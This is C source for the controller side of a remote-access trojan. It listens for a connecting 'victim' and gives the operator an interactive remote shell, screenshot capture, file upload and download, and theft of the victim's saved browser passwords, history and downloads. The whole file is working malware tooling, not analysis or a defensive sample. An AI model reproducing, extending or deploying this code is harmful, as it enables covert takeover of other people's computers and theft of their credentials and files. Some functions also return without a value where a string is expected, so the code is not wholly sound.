#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <limits.h>
#include "c2.h"
#include "common.h"

// Bunch of apis used for python gui

// stdlib free wrapper
void free_wrapper(void* ptr) {
    free(ptr);
}

sock_t sock_setup() {
    // Client and server socket file descriptors
    sock_t server_fd, client_fd;

    // Socket address structure
    struct sockaddr_in addr = {0};
    socklen_t addr_len = sizeof(addr);

    SOCK_INIT();

    // Create a TCP socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    // Config
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;         
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    // Begin listening and accept one connection
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 

    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);

    // Waiting for client connection
    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));

    // Close listening socket for simplicity
    CLOSE_SOCK(server_fd);
    return client_fd;
}

void cleanup(sock_t client_fd) {
    CLOSE_SOCK(client_fd);
    SHUT_DOWN();
}

char* client_info(sock_t client_fd) {
    char* client_info = safe_recv(client_fd, NULL, NULL, 0);
    return client_info;
}

// APIs for handling main features, server must semd payload first to initiate the exchange
void psh_handle(sock_t client_fd) {
    char buf[C2_BUF_SIZE];
    while (1) {
        printf("\nC2> ");
        fflush(stdout);
        if (!fgets(buf, C2_BUF_SIZE, stdin)) break;
        buf[strcspn(buf, "\n")] = 0;

        if (safe_send(client_fd, buf, PSH_CMD, strlen(buf) + 1, 0) <= 0) break;

        if (strcmp(buf, "quit") == 0) break;
        
        char* cmd_output = (char*)safe_recv(client_fd, NULL, NULL, 0);
        if (cmd_output) printf("%s\n", cmd_output);
        free(cmd_output);
    }
    return;
}

void screenshot_handle(sock_t client_fd) {
    // This one doesnt require payload from server
    int dummy = 0;
    if (safe_send(client_fd, &dummy, SCREEN_CMD, sizeof(int), 0) <= 0) return;

    int file_size;
    BYTE* file_buffer = (BYTE*)safe_recv(client_fd, NULL, &file_size, 0);
    if (file_buffer == NULL) return;

    char filename[64];
    time_t now = time(NULL);
    snprintf(filename, sizeof(filename), "screenshot_%ld.bmp", (long)now);

    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("[ERR] fopen");
        free(file_buffer);
        return;
    }

    fwrite(file_buffer, 1, file_size, fp);
    fclose(fp);
    free(file_buffer);

    printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
    return;
}

void download_file_from_client(sock_t client_fd, char* remote_path, char* local_path) {
    if (safe_send(client_fd, remote_path, DL_FILE_CMD, strlen(remote_path) + 1, 0) < 0) return;

    int status;
    // Get status
    if (recv(client_fd, &status, sizeof(int), 0) <= 0) return;

    if (status == 1) {
        int file_size = 0;
        // Get payload
        BYTE *file_buffer = (BYTE*)safe_recv(client_fd, NULL, &file_size, 0);
        if (!file_buffer) {
            printf("[ERR] Failed to receive file contents.\n");
            return;
        }

        FILE *fp = fopen(local_path, "wb");
        if (!fp) {
            perror("[ERR] fopen");
            free(file_buffer);
            return;
        }

        size_t expected = (size_t)file_size;
        size_t written = expected ? fwrite(file_buffer, 1, expected, fp) : 0;
        fclose(fp);
        free(file_buffer);

        if (written != expected) {
            printf("[ERR] Short write when saving %s\n", local_path);
        } else {
            printf("[+] Saved file to %s (%d bytes)\n", local_path, file_size);
        }
    } else {
        printf("[ERR] Client reported failure.\n");
    }
}

void upload_file_to_client(sock_t client_fd, char* remote_path, char* local_path) {
    size_t file_size = 0;
    char *file_buffer = read_file(local_path, &file_size);
    if (!file_buffer) {
        return;
    }

    if (file_size > INT_MAX) {
        printf("[ERR] File too large to transfer (>%d bytes)\n", INT_MAX);
        free(file_buffer);
        return;
    }

    if (safe_send(client_fd, remote_path, UL_FILE_CMD, strlen(remote_path) + 1, 0) < 0) {
        free(file_buffer);
        return;
    }
    if (safe_send(client_fd, file_buffer, UL_FILE_CMD, (int)file_size, 0) < 0) {
        free(file_buffer);
        return;
    }
    free(file_buffer);

    int status;
    if (recv(client_fd, &status, sizeof(int), 0) <= 0) return;

    if (status == 1) {
        printf("[+] Uploaded %zu bytes to %s\n", file_size, remote_path);
    } else {
        printf("[ERR] Client reported failure while uploading.\n");
    }
}

char* browser_password_handle(sock_t client_fd) {
    // This one doesnt require payload from server
    int dummy = 0;
    if (safe_send(client_fd, &dummy, BROWSER_PASS_CMD, sizeof(int), 0) <= 0) return;

    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
    return res;
}

char* browser_history_handle(sock_t client_fd) {
    // This one doesnt require payload from server
    int dummy = 0;
    if (safe_send(client_fd, &dummy, BROWSER_HISTORY_CMD, sizeof(int), 0) <= 0) return;

    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
    return res;
}

char* browser_downloads_handle(sock_t client_fd) {
    // This one doesnt require payload from server
    int dummy = 0;
    if (safe_send(client_fd, &dummy, BROWSER_DL_CMD, sizeof(int), 0) <= 0) return;

    char* res = (char*)safe_recv(client_fd, NULL, NULL, 0);
    return res;
}